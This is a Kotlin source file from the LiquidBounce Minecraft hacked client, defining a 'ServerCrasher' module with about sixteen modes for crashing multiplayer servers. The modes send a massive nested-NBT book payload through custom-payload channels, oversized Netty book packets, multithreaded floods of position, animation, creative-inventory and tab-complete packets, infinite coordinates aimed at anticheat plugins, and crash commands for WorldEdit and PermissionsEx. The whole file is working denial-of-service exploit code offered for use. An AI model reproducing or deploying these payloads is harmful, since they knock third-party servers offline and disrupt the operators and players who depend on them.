/*
 * LiquidBounce Hacked Client
 * A free open source mixin-based injection hacked client for Minecraft using Minecraft Forge.
 * https://github.com/CCBlueX/LiquidBounce/
 */
package net.ccbluex.liquidbounce.features.module.modules.exploit

import io.netty.buffer.Unpooled
import net.ccbluex.liquidbounce.api.enums.ItemType
import net.ccbluex.liquidbounce.api.minecraft.util.WBlockPos
import net.ccbluex.liquidbounce.event.*
import net.ccbluex.liquidbounce.features.module.Module
import net.ccbluex.liquidbounce.features.module.ModuleCategory
import net.ccbluex.liquidbounce.features.module.ModuleInfo
import net.ccbluex.liquidbounce.utils.ClientUtils
import net.ccbluex.liquidbounce.utils.WorkerUtils
import net.ccbluex.liquidbounce.utils.misc.RandomUtils
import net.ccbluex.liquidbounce.utils.runAsync
import net.ccbluex.liquidbounce.utils.timer.MSTimer
import net.ccbluex.liquidbounce.value.ListValue
import java.lang.Thread.sleep
import kotlin.random.Random

// TODO: Remove 'if (WorkerUtils.workers.queue.size < maxWorkQueueSize)' and replace with better stuff
@ModuleInfo(name = "ServerCrasher", description = "Allows you to crash certain server.", category = ModuleCategory.EXPLOIT)
class ServerCrasher : Module()
{
	companion object
	{
		const val bookExploitNBTTag: String = "{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}"

		val nettyExploitTag: String

		init
		{
			val nettyExploitTagBuilder = StringBuilder(1953)
			repeat(1953) { nettyExploitTagBuilder.append('.') }

			nettyExploitTag = "$nettyExploitTagBuilder"
		}
	}

	private val modeValue = ListValue("Mode", arrayOf("Book", "Swing", "MassiveChunkLoading", "WorldEdit", "PermissionsEx", "CubeCraft", "AAC3.1.5", "AACOther", "AAC3.0.5", "BSign", "BEdit", "Netty", "Netty2", "TabComplete", "Minehut", "OldMatrix"), "Book")

	private val pexTimer = MSTimer()

	private var switch = 0
	private var keepAliveKey = 0

	override fun onEnable()
	{
		val thePlayer = mc.thePlayer ?: return

		if (mc.isIntegratedServerRunning)
		{
			ClientUtils.displayChatMessage(thePlayer, "\u00A7c\u00A7lError: \u00A7aYou can't enable \u00A7c\u00A7l'ServerCrasher' \u00A7ain SinglePlayer.")
			state = false
			return
		}

		val networkManager = mc.netHandler.networkManager

		val availableProcessors = Runtime.getRuntime().availableProcessors()

		val provider = classProvider

		switch = 0
		keepAliveKey = 0

		when (modeValue.get().toLowerCase())
		{
			"aac3.1.5" -> runAsync { repeat(10000) { networkManager.sendPacketWithoutEvent(provider.createCPacketPlayerPosition(thePlayer.posX + 9412 * it, thePlayer.entityBoundingBox.minY + 9412 * it, thePlayer.posZ + 9412 * it, true)) } }
			"aacother" -> runAsync { repeat(10000) { networkManager.sendPacketWithoutEvent(provider.createCPacketPlayerPosition(thePlayer.posX + 500000 * it, thePlayer.entityBoundingBox.minY + 500000 * it, thePlayer.posZ + 500000 * it, true)) } }
			"aac3.0.5" -> networkManager.sendPacketWithoutEvent(provider.createCPacketPlayerPosition(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true))
			"worldedit" -> thePlayer.sendChatMessage("//calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<256;c++){}}}}")

			"cubecraft" ->
			{
				// Not really needed but doesn't matter
				thePlayer.setPosition(thePlayer.posX, thePlayer.posY + 0.3, thePlayer.posZ)
			}

			"massivechunkloading" -> runAsync {
				// Fly up into sky
				var yPos = thePlayer.posY
				while (yPos < 255)
				{
					networkManager.sendPacketWithoutEvent(provider.createCPacketPlayerPosition(thePlayer.posX, yPos, thePlayer.posZ, true))
					yPos += 5.0
				}

				// Fly over world
				var i = 0
				while (i < 1337 * 5)
				{
					networkManager.sendPacketWithoutEvent(provider.createCPacketPlayerPosition(thePlayer.posX + i, 255.0, thePlayer.posZ + i, true))
					i += 5
				}
			}

			"bsign" ->
			{
				val tag = provider.createNBTTagCompound()
				val pages = provider.createNBTTagList()

				repeat(50) { pages.appendTag(provider.createNBTTagString(bookExploitNBTTag)) }

				tag.setString("author", "AuthSmasher" + Random.nextInt(20))
				tag.setString("title", "MojangIstToll" + Random.nextInt(20))
				tag.setInteger("resolved", 1)
				tag.setTag("pages", pages)

				val book = provider.createItemStack(provider.getItemEnum(ItemType.WRITABLE_BOOK))

				book.tagCompound = tag

				val pb = provider.createPacketBuffer(Unpooled.buffer())
				pb.writeItemStackToBuffer(book)

				networkManager.sendPacketWithoutEvent(provider.createCPacketCustomPayload("MC|BSign", pb))
			}

			"bedit" ->
			{
				val tag = provider.createNBTTagCompound()
				val pages = provider.createNBTTagList()

				repeat(50) { pages.appendTag(provider.createNBTTagString(bookExploitNBTTag)) }

				tag.setString("author", "AuthSmasher" + Random.nextInt(20))
				tag.setString("title", "MojangIstToll" + Random.nextInt(20))
				tag.setInteger("resolved", 1)
				tag.setTag("pages", pages)

				val book = provider.createItemStack(provider.getItemEnum(ItemType.WRITABLE_BOOK))

				book.tagCompound = tag

				val packetBuffer = provider.createPacketBuffer(Unpooled.buffer())
				packetBuffer.writeItemStackToBuffer(book)

				networkManager.sendPacketWithoutEvent(provider.createCPacketCustomPayload("MC|BEdit", packetBuffer))
			}

			"netty" ->
			{
				val book3 = provider.createItemStack(provider.getItemEnum(ItemType.WRITABLE_BOOK))
				val author = "Netty$nettyExploitTag"

				val tag3 = provider.createNBTTagCompound()
				val list3 = provider.createNBTTagList()

				repeat(340) { list3.appendTag(provider.createNBTTagString(nettyExploitTag)) }

				tag3.setString("author", author)
				tag3.setString("title", nettyExploitTag)
				tag3.setTag("pages", list3)

				if (book3.tagCompound != null)
				{
					val tagb = book3.tagCompound
					tagb?.setTag("pages", list3)
				}
				else book3.setTagInfo("pages", list3)

				networkManager.sendPacketWithoutEvent(provider.createCPacketPlayerBlockPlacement(WBlockPos(thePlayer.posX, thePlayer.posY - 2.0, thePlayer.posZ), 1, book3, 0.0f, 0.0f, 0.0f))
			}

			"netty2" ->
			{
				val book4 = provider.createItemStack(provider.getItemEnum(ItemType.WRITABLE_BOOK))
				val author4 = "Netty$nettyExploitTag"

				val tag4 = provider.createNBTTagCompound()
				val list4 = provider.createNBTTagList()

				repeat(340) { list4.appendTag(provider.createNBTTagString(nettyExploitTag)) }

				tag4.setString("author", author4)
				tag4.setString("title", nettyExploitTag)
				tag4.setTag("pages", list4)

				if (book4.tagCompound != null)
				{
					val tagb = book4.tagCompound
					tagb?.setTag("pages", list4)
				}
				else book4.setTagInfo("pages", list4)

				repeat(availableProcessors) {
					runAsync {
						repeat(100000) {
							networkManager.sendPacketWithoutEvent(provider.createCPacketCreativeInventoryAction(100, book4))

							try
							{
								sleep(1L)
							}
							catch (e: InterruptedException)
							{
								e.printStackTrace()
							}
						}
					}
				}
			}
		}
	}

	@EventTarget
	fun onMotion(event: MotionEvent)
	{
		val thePlayer = mc.thePlayer ?: return

		if (event.eventState == EventState.POST) return

		val networkManager = mc.netHandler.networkManager

		val maxWorkQueueSize = Runtime.getRuntime().availableProcessors() * 10 // xd

		val provider = classProvider

		when (modeValue.get().toLowerCase())
		{
			"book" ->
			{
				val bookStack = provider.createItemStack(provider.getItemEnum(ItemType.WRITABLE_BOOK))
				val bookCompound = provider.createNBTTagCompound()

				bookCompound.setString("author", RandomUtils.randomNumber(16))
				bookCompound.setString("title", RandomUtils.randomNumber(16))

				val pageList = provider.createNBTTagList()
				val pageText = RandomUtils.randomNumber(600)


				repeat(50) { pageList.appendTag(provider.createNBTTagString(pageText)) }

				bookCompound.setTag("pages", pageList)
				bookStack.tagCompound = bookCompound

				// WorkQueue overflow failsafe
				if (WorkerUtils.workers.queue.size < maxWorkQueueSize) runAsync {
					val bsign = Random.nextBoolean()
					repeat(100) {
						val packetBuffer = provider.createPacketBuffer(Unpooled.buffer())
						packetBuffer.writeItemStackToBuffer(bookStack)
						networkManager.sendPacketWithoutEvent(provider.createCPacketCustomPayload(if (bsign) "MC|BSign" else "MC|BEdit", packetBuffer))
					}
				}
			}

			"cubecraft" ->
			{
				val x = thePlayer.posX
				val y = thePlayer.posY
				val z = thePlayer.posZ

				// WorkQueue overflow failsafe
				if (WorkerUtils.workers.queue.size < maxWorkQueueSize) runAsync {
					repeat(3000) {
						networkManager.sendPacketWithoutEvent(provider.createCPacketPlayerPosition(x, y + 0.09999999999999, z, false))
						networkManager.sendPacketWithoutEvent(provider.createCPacketPlayerPosition(x, y, z, true))
					}
				}

				thePlayer.motionY = 0.0
			}

			"permissionsex" -> if (pexTimer.hasTimePassed(2000))
			{

				// Send crash command
				thePlayer.sendChatMessage(if (Random.nextBoolean()) "/pex promote a a" else "/pex demote a a")
				pexTimer.reset()
			}

			"swing" -> if (WorkerUtils.workers.queue.size < maxWorkQueueSize) runAsync {
				repeat(5000) { networkManager.sendPacketWithoutEvent(provider.createCPacketAnimation()) }
			}

			"tabcomplete" -> if (WorkerUtils.workers.queue.size < maxWorkQueueSize) runAsync {
				repeat(5000) { networkManager.sendPacketWithoutEvent(provider.createCPacketTabComplete("/")) }
			}

			"minehut" ->
			{
				switch++
				keepAliveKey += 8

				networkManager.sendPacketWithoutEvent(provider.createCPacketPlayer(switch == 1))
				networkManager.sendPacketWithoutEvent(provider.createCPacketKeepAlive(keepAliveKey.toLong()))
			}

			"oldmatrix" -> if (thePlayer.ticksExisted % 2 == 0) mc.netHandler.addToSendQueue(provider.createCPacketPlayerPosition(Random.nextDouble(-32768.0, 32768.0), Random.nextDouble(-32768.0, 32768.0), Random.nextDouble(-32768.0, 32768.0), true))

			else -> state = false // Disable module when mode is just a one run crasher
		}
	}

	@EventTarget
	fun onWorld(event: WorldEvent)
	{
		if (event.worldClient == null) state = false // Disable module in case you left (or crashed) from the server
	}

	@EventTarget
	fun onTick(@Suppress("UNUSED_PARAMETER") event: TickEvent)
	{
		if (mc.thePlayer == null || mc.theWorld == null) state = false // Disable module in case you left (or crashed) from the server
	}

	override val tag: String
		get() = modeValue.get()
}
